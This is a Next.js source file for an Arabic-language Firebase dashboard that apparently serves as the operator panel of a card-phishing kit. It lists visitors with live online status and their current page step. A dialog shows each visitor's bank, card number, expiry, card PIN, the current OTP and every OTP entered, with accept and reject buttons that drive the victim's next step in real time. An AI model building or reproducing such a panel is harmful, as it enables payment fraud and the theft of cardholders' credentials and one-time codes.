"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Trash2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"

import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { db, auth, database } from "@/lib/firestore"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { onValue, ref } from "firebase/database"

const getCountryFlag = (country?: string): string => {
  const countryFlags: { [key: string]: string } = {
    السعودية: "🇸🇦",
    الإمارات: "🇦🇪",
    الكويت: "🇰🇼",
    قطر: "🇶🇦",
    البحرين: "🇧🇭",
    عمان: "🇴🇲",
    الأردن: "🇯🇴",
    لبنان: "🇱🇧",
    سوريا: "🇸🇾",
    العراق: "🇮🇶",
    مصر: "🇪🇬",
    المغرب: "🇲🇦",
    الجزائر: "🇩🇿",
    تونس: "🇹🇳",
    ليبيا: "🇱🇾",
    السودان: "🇸🇩",
    اليمن: "🇾🇪",
  }
  return countryFlags[country || ""] || "🌍"
}

interface Notification {
  id: string
  name: string
  hasPersonalInfo: boolean
  hasCardInfo: boolean
  currentPage: string
  createdDate: string
  phone?: string
  notificationCount: number  
    fullName?: string

  isOnline?: boolean
  country?: string
  personalInfo?: {
    id: string
    fullName: string
    phone: string
  }
  bank: string
  cardNumber: string
  prefix: string
  year: string
  month: string
  cvv: string
  otp: string
  pass: string
  allOtps: string[]
  status?: "pending" | "approved" | "rejected"
  isHidden?: boolean
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [pageName, setPagename] = useState<string>("")
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const router = useRouter()

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]
        setNotifications(notificationsData)
        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }
  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handlePageName = (id: string) => {
    setPagename("asd")
  }
  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }
// Create a separate component for user status that returns both the badge and the status
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={`
        ${
          status === "online"
            ? "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300"
            : "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300"
        } transition-colors duration-300
      `}
    >
      <span
        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}
      ></span>
      <span className="text-xs">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  if (isLoading) {
    return <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">جاري التحميل...</div>
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 text-white p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-8">
          <div>
            <h1 className="text-3xl font-bold mb-2">لوحة الإشعارات</h1>
            <p className="text-gray-400">إدارة جميع الإشعارات والمعلومات</p>
          </div>
          <div className="flex flex-col sm:flex-row gap-3 mt-4 sm:mt-0">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600 transition-colors shadow-lg"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button
              variant="outline"
              onClick={handleLogout}
              className="bg-gray-700 hover:bg-gray-600 text-white border-gray-600 transition-colors shadow-lg"
            >
              تسجيل الخروج
            </Button>
          </div>
        </div>

        <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl border border-gray-700/50 overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-700">
                  <th className="px-4 py-3 text-right">الإسم</th>
                  <th className="px-4 py-3 text-right">الحالة</th>
                  <th className="px-4 py-3 text-right">الدولة</th>
                  <th className="px-4 py-3 text-right">المعلومات</th>
                  <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                  <th className="px-4 py-3 text-right">الوقت</th>
                  <th className="px-4 py-3 text-center">عدد الرموز</th>
                  <th className="px-4 py-3 text-center">حذف</th>
                </tr>
              </thead>
              <tbody>
                {notifications.map((notification) => (
                  <tr key={notification.id} className="border-b border-gray-600 hover:bg-gray-750 transition-colors">
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-sm font-medium">
                          {notification?.fullName?.charAt(0) || "N"}
                        </div>
                        <span className="font-medium">{notification?.fullName || "غير محدد"}</span>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div
                          className={`w-2 h-2 rounded-full ${notification.isOnline ? "bg-green-400" : "bg-gray-400"}`}
                        ></div>
                      
                         <UserStatus userId={notification.id}/>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <span className="text-2xl">
                          {getCountryFlag(notification.country )}
                        </span>
                        <span>{notification.country || "غير محدد"}</span>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex flex-col sm:flex-row gap-2">
                        <Badge
                          variant={notification?.fullName ? "default" : "destructive"}
                          className="rounded-md cursor-pointer hover:opacity-80 transition-opacity"
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification?.fullName ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification.cardNumber ? "default" : "destructive"}
                          className={`rounded-md cursor-pointer hover:opacity-80 transition-opacity ${notification.cardNumber ? "bg-green-500 hover:bg-green-600" : ""}`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <Badge variant="outline" className="bg-blue-500/10 text-blue-400 border-blue-500/20">
                        خطوه - {notification.currentPage}
                      </Badge>
                    </td>
                    <td className="px-4 py-3 text-sm text-gray-300">
                      {formatDistanceToNow(new Date(notification.createdDate), {
                        addSuffix: true,
                        locale: ar,
                      })}
                    </td>
                    <td className="px-4 py-3 text-center">
                      <Badge variant={notification?.allOtps?.length>0?"default":"destructive"} className=" hover:bg-green-600">
                        {notification?.allOtps?.length||0}
                      </Badge>
                    </td>
                    <td className="px-4 py-3 text-center">
                      <Button
                        variant="destructive"
                        size="sm"
                        onClick={() => handleDelete(notification.id)}
                        className="bg-red-500 hover:bg-red-600 transition-colors"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-800 text-white" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl">{selectedInfo === "personal" ? "المعلومات الشخصية" : "معلومات البطاقة"}</DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal" ? "تفاصيل المعلومات الشخصية" : "تفاصيل معلومات البطاقة"}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification?.personalInfo && (
            <div className="space-y-4">
              <div className="flex items-center gap-3 p-3 bg-gray-700 rounded-lg">
                <div className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center text-lg font-bold">
                  {selectedNotification.personalInfo.fullName?.charAt(0) || "N"}
                </div>
                <div>
                  <h3 className="font-semibold text-lg">{selectedNotification.personalInfo.fullName}</h3>
                  <p className="text-gray-400 text-sm">معلومات المستخدم</p>
                </div>
              </div>

              <div className="space-y-3">
                <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                  <span className="text-gray-300">الاسم الكامل:</span>
                  <span className="font-medium">{selectedNotification?.fullName}</span>
                </div>
                <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                  <span className="text-gray-300">رقم الهاتف:</span>
                  <span className="font-medium">{selectedNotification?.phone}</span>
                </div>
             
                <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                  <span className="text-gray-300">الحالة:</span>
                  <div className="flex items-center gap-2">
                    <div
                      className={`w-2 h-2 rounded-full ${selectedNotification.isOnline ? "bg-green-400" : "bg-gray-400"}`}
                    ></div>
                    <span
                      className={`font-medium ${selectedNotification.isOnline ? "text-green-400" : "text-gray-400"}`}
                    >
                      {selectedNotification.isOnline ? "متصل" : "غير متصل"}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-300 mx-4">البنك:</strong> {selectedNotification.bank}
              </p>
              <p></p>
              <p>
                <strong className="text-red-300 mx-4">رقم البطاقة:</strong> {selectedNotification.cardNumber}-{" "}
                {selectedNotification.prefix}
              </p>
              <p>
                <strong className="text-red-300 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
                {selectedNotification.month}
              </p>

              <p className="flex items-center">
                <strong className="text-red-300 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
              </p>
              <p className="flex items-centerpt-4">
                <strong className="text-red-300 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
              </p>
              <></>
              <p>
                <strong className="text-red-300 mx-4">جميع رموز التحقق:</strong>
                <div className="grid grid-cols-4">
                  {selectedNotification.allOtps &&
                    selectedNotification.allOtps.map((i, index) => <Badge key={index}>{i}</Badge>)}
                </div>
              </p>
              <div className="flex justify-between mx-1">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-3 bg-green-500"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-3"
                  variant="destructive"
                >
                  رفض
                </Button>
              </div>
              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
